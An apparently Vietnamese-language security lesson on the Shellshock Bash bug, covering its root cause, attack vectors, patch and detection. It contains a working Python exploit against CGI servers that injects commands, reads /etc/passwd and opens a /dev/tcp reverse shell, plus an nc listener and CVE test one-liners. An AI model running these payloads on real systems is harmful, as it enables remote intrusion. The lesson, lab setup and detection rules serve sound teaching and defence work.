---
title: "07. Shellshock — Bash Environment Injection"
tags: [security, cve, landmark-cves, shellshock, bash, cgi, injection, lesson-07]
aliases: [Shellshock, CVE-2014-6271]
created: 2026-03-24
---

> **Prerequisites**: [[01-memory-model-exploit-primitives|01. Memory Model & Exploit Primitives]], Linux process/environment basics, HTTP cơ bản
> **Objectives**:
> - Hiểu cơ chế Bash export function qua environment variable
> - Phân tích source code `variable.c` — hàm `initialize_shell_variables()` và điểm lỗi
> - Hiểu tại sao `parse_and_execute()` chạy cả phần trailing command
> - Nắm toàn bộ attack surface: CGI, SSH ForceCommand, DHCP hooks, git hooks
> - Viết PoC Python tấn công CGI server qua User-Agent header
> - Phân biệt CVE-2014-6271 với các CVE trong cùng family (7169, 6277, 6278)
> - Đọc được Wireshark capture của Shellshock request

---

## Bối cảnh: Bug 25 Năm Tuổi trong Bash

Shellshock được phát hiện bởi Stéphane Chazelas vào ngày 12/9/2014 và công bố ngày 24/9/2014. Điều đáng kinh ngạc: lỗi tồn tại trong **tất cả phiên bản Bash từ 1.03 đến 4.3** — nghĩa là hơn 25 năm. Bash được dùng làm default shell trên hầu hết Linux, macOS, và nhiều thiết bị nhúng.

Tên "Shellshock" (hay "Bashdoor" theo tên gốc của Chazelas) ám chỉ việc shell — công cụ bảo vệ — lại trở thành cửa vào cho kẻ tấn công.

Điều làm Shellshock đặc biệt nguy hiểm không phải bản chất kỹ thuật (logic flaw, không phải memory bug), mà chính là **attack surface khổng lồ**: bất kỳ chương trình nào pass dữ liệu người dùng vào environment variable rồi invoke Bash đều có thể bị khai thác. Số lượng hệ thống ảnh hưởng ước tính lên đến **500 triệu server**.

---

## Bash Function Export — Nền tảng cần hiểu

### Function export trong Bash là gì?

Bash cho phép export function để child process kế thừa:

```bash
myfunction() {
    echo "Hello from function"
}
export -f myfunction
bash -c "myfunction"
```

Khi `export -f` được dùng, Bash encode function thành environment variable. Ví dụ với `myfunction`, biến môi trường sẽ là:

```bash
env | grep myfunction
# myfunction=() {  echo "Hello from function"\n}
```

Biến này có **giá trị bắt đầu bằng chuỗi `() {`** — đây là "dấu hiệu nhận dạng" mà Bash dùng để phân biệt exported function với biến thông thường.

### Child process khởi tạo thế nào?

Khi một Bash process mới khởi động (ví dụ qua `bash -c "..."`), nó gọi `initialize_shell_variables()` để nạp toàn bộ environment variables. Hàm này duyệt qua mỗi biến và kiểm tra xem có phải exported function không:

```c
/* Bash 4.2 source — variables.c, hàm initialize_shell_variables() */
for (string_index = 0; string = env[string_index++]; ) {
    /* Tách name=value */
    char_index = 0;
    name = string;
    while ((c = *string++) != '=')
        char_index++;
    /* string bây giờ trỏ đến value (phần sau dấu =) */

    /* Kiểm tra: value có bắt đầu bằng "() {" không? */
    if (privmode == 0 && read_but_dont_execute == 0
        && STREQN("() {", string, 4)) {

        /* Đây là exported function — import nó */
        string_length = strlen(string);
        temp_string = (char *)xmalloc(3 + string_length + char_index);

        /* Tạo string: "name value" */
        strcpy(temp_string, name);
        temp_string[char_index] = ' ';
        strcpy(temp_string + char_index + 1, string);

        /* Parse và execute TOÀN BỘ chuỗi temp_string */
        parse_and_execute(temp_string, name,
                          SEVAL_NONINT|SEVAL_NOHIST);
        /*  ↑
         *  BUG: hàm này execute KHÔNG CHỈ function definition
         *  mà execute toàn bộ nội dung — bao gồm cả phần sau dấu }
         */
    }
    /* ... */
}
```

> [!definition] Definition 7.1 — Root Cause của Shellshock
> Hàm `initialize_shell_variables()` phát hiện exported function qua prefix `() {`, sau đó gọi `parse_and_execute()` với **toàn bộ** giá trị của biến môi trường đó. Parser của Bash định nghĩa function rồi **tiếp tục parse và execute phần còn lại** — không dừng ở dấu `}` kết thúc function.
>
> Đây là **logic flaw**, không phải memory bug. Không có tràn bộ nhớ, không có memory corruption — chỉ là parser quá dễ tính (permissive parser).

### Minh họa bằng example

```bash
# Biến x chứa function definition hợp lệ + trailing command
x='() { :; }; echo SHELLSHOCK_EXECUTED'

# Export và khởi động child bash
export x
bash -c "echo Normal output"
```

Output trên Bash ≤ 4.3 (vulnerable):

```text
SHELLSHOCK_EXECUTED
Normal output
```

Chuỗi `echo SHELLSHOCK_EXECUTED` **không phải là một phần của function** — nó là trailing command. Bash vulnerable execute nó ngay khi khởi động và import environment.

Output trên Bash ≥ 4.3-patch:

```text
bash: x: line 1: syntax error near unexpected token `}'
bash: error importing function definition for `x'
Normal output
```

Phiên bản đã vá từ chối import và báo lỗi.

### Parse flow so sánh

```text
Bash VULNERABLE (≤ 4.3):
Input: x='() { :; }; echo INJECTED'
                     ↑
  parse_and_execute() nhận string này → parse function def → parse "; echo INJECTED"
  → execute echo INJECTED   ← INJECTION

Bash PATCHED (≥ 4.3-patch):
Input: x='() { :; }; echo INJECTED'
  Parser phát hiện content sau } không phải whitespace/comment → ERROR
  → Từ chối import, bỏ qua toàn bộ biến này
```

---

## Attack Surface — Ai Invoke Bash với User-Controlled Env?

Ba điều kiện để hệ thống vulnerable:
1. Chạy Bash ≤ 4.3 (unpatched)
2. Có application nhận input từ attacker và đặt vào environment variable
3. Application đó invoke Bash subprocess

### Vector 1 — CGI (Phổ biến nhất)

Common Gateway Interface (CGI) là cơ chế Apache/Nginx chạy script để tạo dynamic content. Khi web server nhận HTTP request với CGI, nó:
1. Map các HTTP header thành environment variables: `HTTP_USER_AGENT`, `HTTP_REFERER`, `QUERY_STRING`, v.v.
2. Execute CGI script — nếu script là `.sh`, `.bash`, hoặc script có `#!/bin/bash` shebang → invoke Bash
3. Bash child process khởi động với environment chứa các header đó

```text
Attacker                          Apache + mod_cgi                  Bash
  │                                      │                            │
  │── GET /cgi-bin/test.sh ─────────────▶│                            │
  │   User-Agent: () { :; }; cmd         │                            │
  │                                      │── execve("/bin/bash") ────▶│
  │                                      │   env: HTTP_USER_AGENT=    │
  │                                      │   '() { :; }; cmd'         │
  │                                      │                            │── initialize_shell_variables()
  │                                      │                            │   detects () { → parse_and_execute
  │                                      │                            │   → execute cmd  ← RCE
  │◀── HTTP response (possibly with cmd output) ──────────────────────│
```

### Vector 2 — SSH ForceCommand

OpenSSH cho phép cấu hình `ForceCommand` để giới hạn command user có thể chạy. Tuy nhiên, khi user SSH vào, biến `SSH_ORIGINAL_COMMAND` chứa command user muốn chạy — và được pass vào shell environment:

```bash
# sshd_config
Match User restricted_user
    ForceCommand /usr/bin/some_script.sh

# Khi user SSH vào với: ssh restricted_user@server '() { :; }; /bin/bash'
# SSH_ORIGINAL_COMMAND = '() { :; }; /bin/bash'
# some_script.sh được invoke với environment chứa SSH_ORIGINAL_COMMAND
# → nếu some_script.sh dùng bash → Shellshock
```

### Vector 3 — DHCP Client Hook

Nhiều Linux distribution dùng bash script để xử lý DHCP events (`/etc/dhcp/dhclient-exit-hooks.d/`). DHCP server có thể gửi options tùy ý — nếu DHCP client đặt các option này vào environment và invoke bash hook:

```text
Malicious DHCP server → gửi option 114 (URL) = '() { :; }; rm -rf /tmp/evil'
dhclient nhận option → set env variable → invoke bash hook → Shellshock
```

### Vector 4 — Git Hooks

Git hooks là bash script. Nếu repository clone từ remote có thể controlled và hook được invoke với attacker-controlled data trong environment:

```bash
# .git/hooks/pre-receive — invoke khi nhận push
#!/bin/bash
# GIT_DIR, GIT_WORK_TREE set từ git process → nếu chứa () { → exploit
```

### Bảng tổng hợp attack vectors

| Vector | Environment variable bị inject | Điều kiện |
|--------|--------------------------------|-----------|
| Apache CGI | `HTTP_*` headers (User-Agent, Referer, Cookie) | mod_cgi + bash CGI script |
| SSH | `SSH_ORIGINAL_COMMAND`, `SSH_CLIENT` | ForceCommand hoặc restricted shell |
| DHCP | DHCP option values | dhclient-exit-hooks dùng bash |
| Git hooks | `GIT_*` variables | Repository nhận data từ remote |
| Postfix/Sendmail | `SENDER`, `RECIPIENT`, mail headers | Mail filter scripts |
| Nagios/monitoring | Plugin output, check_command | Monitoring hooks |

---

## Source Code Patch Analysis

### Trước patch (Bash 4.2)

```c
/* variables.c — initialize_shell_variables() */
if (privmode == 0 && read_but_dont_execute == 0
    && STREQN("() {", string, 4)) {

    string_length = strlen(string);
    temp_string = (char *)xmalloc(3 + string_length + char_index);
    strcpy(temp_string, name);
    temp_string[char_index] = ' ';
    strcpy(temp_string + char_index + 1, string);

    /* BUG: parse_and_execute chạy toàn bộ string,
       không chỉ phần function definition */
    parse_and_execute(temp_string, name, SEVAL_NONINT|SEVAL_NOHIST);
}
```

### Sau patch (Bash 4.3-patch)

Patch thay đổi cơ bản cách function được export/import. Thay vì encode function định nghĩa trực tiếp vào giá trị biến, Bash bây giờ dùng naming convention đặc biệt:

```c
/* Cách export: tên biến có prefix "BASH_FUNC_" và suffix "%%" */
/* Ví dụ: function "myfunc" được export thành:
   BASH_FUNC_myfunc%%=() { echo hello; }
   Tên biến này không hợp lệ với shell thông thường → không bị import ngẫu nhiên */

/* Khi import, parser kiểm tra strict: */
if (name starts with "BASH_FUNC_" && name ends with "%%") {
    /* Chỉ parse phần function definition — không execute trailing content */
    validate_function_definition(string);
    /* Nếu có bất kỳ lệnh nào sau } → reject */
}
```

Sau patch, `env` sẽ show:

```bash
export -f myfunc
env | grep myfunc
# BASH_FUNC_myfunc%%=() { echo hello; }
```

---

## PoC Python — Tấn công CGI qua HTTP

### Dựng target lab

```bash
docker pull vulnerables/cve-2014-6271
docker run -d -p 8080:80 --name shellshock vulnerables/cve-2014-6271
```

Hoặc tự tạo CGI script vulnerable:

```bash
mkdir -p /var/www/html/cgi-bin
cat > /var/www/html/cgi-bin/vuln.sh << 'EOF'
#!/bin/bash
echo "Content-Type: text/plain"
echo ""
echo "Hello from CGI"
echo "User-Agent: $HTTP_USER_AGENT"
EOF
chmod +x /var/www/html/cgi-bin/vuln.sh
# Chạy Apache với mod_cgi và bash cũ
```

### PoC Python — Test và Exploit

```python
import requests
import socket
import subprocess
import sys

TARGET = "http://localhost:8080"
CGI_PATH = "/cgi-bin/vuln.sh"

def test_vulnerable(target, path):
    """Kiểm tra nhanh xem server có vulnerable không."""
    marker = "SHELLSHOCK_TEST_8675309"
    payload = f"() {{ :; }}; echo {marker}"

    headers = {
        "User-Agent": payload,
        "Referer": payload,
        "Cookie": payload,
    }
    try:
        resp = requests.get(target + path, headers=headers, timeout=5)
        if marker in resp.text:
            print(f"[+] VULNERABLE! Marker '{marker}' found in response")
            print(f"    Response snippet: {resp.text[:200]}")
            return True
        else:
            print(f"[-] Not vulnerable or marker not reflected")
            print(f"    Status: {resp.status_code}, Response: {resp.text[:100]}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection error: {e}")
        return False

def exploit_reverse_shell(target, path, lhost, lport):
    """
    Gửi reverse shell payload qua User-Agent header.
    Phải có listener: nc -lvnp <lport>
    """
    payload = (
        f"() {{ :; }}; "
        f"/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    )
    headers = {"User-Agent": payload}
    print(f"[*] Sending reverse shell payload to {target}{path}")
    print(f"[*] Payload: {payload}")
    print(f"[*] Make sure you have listener: nc -lvnp {lport}")
    try:
        requests.get(target + path, headers=headers, timeout=3)
    except requests.exceptions.ReadTimeout:
        print("[*] Timeout — shell may have connected")
    except Exception as e:
        print(f"[-] Error: {e}")

def exploit_command_injection(target, path, command):
    """
    Inject arbitrary command và đọc output qua HTTP response.
    Chỉ work nếu CGI script in output về response.
    """
    payload = f"() {{ :; }}; echo; {command}"
    headers = {
        "User-Agent": payload,
        "Referer": payload,
    }
    try:
        resp = requests.get(target + path, headers=headers, timeout=5)
        print(f"[*] Command: {command}")
        print(f"[*] Response ({resp.status_code}):")
        print(resp.text)
        return resp.text
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def exploit_all_headers(target, path, command):
    """
    Thử inject qua nhiều header khác nhau — không biết header nào được map vào env.
    Tất cả HTTP_ headers đều được pass vào environment bởi CGI.
    """
    marker = "FOUND_IN_"
    payloads = {}
    for header in ["User-Agent", "Referer", "Cookie", "X-Forwarded-For", "Accept"]:
        payloads[header] = (
            f"() {{ :; }}; echo {marker}{header.upper().replace('-','_')}; {command}"
        )

    resp = requests.get(target + path, headers=payloads, timeout=5)
    print(f"[*] Multi-header response:")
    print(resp.text[:500])

    for header in payloads:
        env_name = header.upper().replace("-", "_")
        if f"{marker}{env_name}" in resp.text:
            print(f"[+] Injection successful via {header} (env: HTTP_{env_name})")

if __name__ == "__main__":
    print("=== Shellshock PoC ===")
    print(f"Target: {TARGET}{CGI_PATH}")
    print()

    if test_vulnerable(TARGET, CGI_PATH):
        print("\n[*] Running command injection: id")
        exploit_command_injection(TARGET, CGI_PATH, "id")

        print("\n[*] Running command injection: cat /etc/passwd")
        exploit_command_injection(TARGET, CGI_PATH, "cat /etc/passwd | head -5")

        print("\n[*] Testing all headers...")
        exploit_all_headers(TARGET, CGI_PATH, "hostname")
```

### Reverse Shell Listener

```bash
nc -lvnp 4444

python3 shellshock_poc.py
```

---

## Wireshark Analysis — Nhận Dạng Shellshock Traffic

### Filter

```text
http.request && frame contains "() {"
```

Hoặc tìm pattern trong tất cả TCP:

```text
tcp contains "() {"
```

### Dấu hiệu đặc trưng trong packet

```text
GET /cgi-bin/vuln.sh HTTP/1.1
Host: 192.168.1.100
User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.1.4/4444 0>&1
             ↑ đây là dấu hiệu rõ ràng nhất
Accept: */*

Các dấu hiệu khác:
- Chuỗi "() {" trong bất kỳ HTTP header nào
- "() { :; };" hoặc "() { ignored; };" — đây là canonical form
- "/dev/tcp/" trong header — dấu hiệu reverse shell
- "curl", "wget", "nc", "bash -i" trong header value
```

### Python Wireshark parser

```python
from scapy.all import rdpcap, TCP, Raw

def find_shellshock_in_pcap(pcap_file):
    pkts = rdpcap(pcap_file)
    print(f"[*] Analyzing {len(pkts)} packets from {pcap_file}")

    shellshock_patterns = [b"() {", b"() { ", b"(){"]
    found = 0

    for i, pkt in enumerate(pkts):
        if Raw not in pkt:
            continue
        payload = pkt[Raw].load
        for pattern in shellshock_patterns:
            if pattern in payload:
                src = pkt[TCP].sport if TCP in pkt else "?"
                dst = pkt[TCP].dport if TCP in pkt else "?"
                print(f"\n[+] Packet #{i}: {src} → {dst}")
                try:
                    decoded = payload.decode('utf-8', errors='replace')
                    lines = [l for l in decoded.split('\r\n')
                             if any(p.decode() in l for p in shellshock_patterns)]
                    for line in lines[:3]:
                        print(f"    {line[:100]}")
                except Exception:
                    print(f"    Raw: {payload[:100]}")
                found += 1
                break

    print(f"\n[*] Total suspicious packets: {found}")
```

---

## CVE Family — Không Chỉ Có 6271

Shellshock bộc lộ rằng Bash parser là một attack surface lớn. Sau 6271, nhiều CVE liên quan được tìm thấy:

| CVE | Tên | Mô tả ngắn | CVSS |
|-----|-----|------------|------|
| **CVE-2014-6271** | Shellshock gốc | Trailing command sau function def được execute | 9.8 |
| **CVE-2014-7169** | Patch bypass | Incomplete fix — vẫn có thể tạo file và execute qua `(a)=>\` trick | 9.8 |
| **CVE-2014-6277** | Segfault via malformed def | Crash (DoS) qua specially crafted function | 10.0 |
| **CVE-2014-6278** | Another parser bypass | Còn một đường inject khác sau patch 7169 | 9.8 |
| **CVE-2014-7186** | OOB read in parser | Out-of-bounds read trong Bash parser | 7.5 |
| **CVE-2014-7187** | Off-by-one | Off-by-one trong here-document parsing | 6.5 |

Test nhanh từng CVE:

```bash
# CVE-2014-6271
env x='() { :;}; echo CVE-6271' bash -c "echo test"

# CVE-2014-7169 (trên hệ thống đã patch 6271)
env X='() { (a)=>\' bash -c "echo date"; cat echo

# CVE-2014-7186
bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo "CVE-2014-7186 vulnerable"
```

> [!definition] Definition 7.2 — Lớp Lỗ Hổng (Vulnerability Class)
> Shellshock thuộc lớp **Command/Environment Injection** — không phải memory corruption. Cơ chế: parser tin tưởng input từ environment mà không sanitize → execute code từ source không đáng tin. Lớp lỗi này cũng thấy trong Log4Shell (JNDI lookup), OGNL injection (Struts), và nhiều template engine injection khác. **Điểm chung: bất kỳ eval/execute nào nhận input từ untrusted source đều nguy hiểm.**

---

## Detection & Mitigation

### Kiểm tra phiên bản Bash

```bash
bash --version

bash -c 'env x="() { :;}; echo VULNERABLE" bash -c "echo test" 2>/dev/null | grep -q VULNERABLE && echo "VULNERABLE" || echo "Patched"'
```

### Patch

```bash
sudo apt-get update && sudo apt-get install --only-upgrade bash

sudo yum update bash

bash --version
```

Phiên bản an toàn: `GNU bash, version 4.3.xx-patch`, hoặc Bash 5.x.

### WAF Rule (Apache mod_security)

```text
SecRule REQUEST_HEADERS "@contains () {" \
    "id:100001,phase:2,deny,status:400,\
     msg:'Shellshock Attack Detected',\
     logdata:'%{MATCHED_VAR_NAME}: %{MATCHED_VAR}'"
```

### Thay thế CGI bằng modern approach

CGI invokes a new process per request — đây là pattern cũ và nguy hiểm. Modern alternatives:
- **FastCGI / PHP-FPM**: process persistent, không spawn bash mới mỗi request
- **WSGI/ASGI** (Python): application server không dùng bash
- **Node.js / Go**: không cần bash làm intermediary

Nếu vẫn phải dùng CGI: không dùng bash shebang — dùng Python hoặc Perl thay thế.

---

## Summary

- Bash cho phép export function thành environment variable với format `name='() { body; }'`
- `initialize_shell_variables()` phát hiện format này qua `STREQN("() {", ...)` rồi gọi `parse_and_execute()` với **toàn bộ** string
- Parser execute phần sau `}` như lệnh shell thông thường → command injection
- Attack vector phổ biến nhất: Apache CGI — HTTP headers → `HTTP_*` env vars → bash CGI script
- Payload canonical: `() { :; }; <command>` — function body rỗng, command trailing
- Patch: đổi encoding sang `BASH_FUNC_name%%` và validate strict — từ chối bất kỳ trailing content nào
- CVE family: 6271, 7169, 6277, 6278, 7186, 7187 — parser là attack surface rộng
- **Lớp lỗ hổng**: Command Injection qua permissive parser — không phải memory bug

---

## References

- Portcullis Labs — source code analysis: https://labs.portcullis.co.uk/blog/cve-2014-6271-shellshock-the-story-of-a-permissive-parser/
- h4r1337 — deep dive with patch analysis: https://h4r1337.github.io/posts/shellshock/
- Wikipedia — Shellshock full CVE family: https://en.wikipedia.org/wiki/Shellshock_(software_bug)
- Qualys — initial disclosure + CVE-7169 bypass: https://blog.qualys.com/vulnerabilities-threat-research/2014/09/24/bash-remote-code-execution-vulnerability-cve-2014-6271
- Bash source (variable.c) — GNU Savannah: https://git.savannah.gnu.org/cgit/bash.git
- exploit-db #34765: https://www.exploit-db.com/exploits/34765
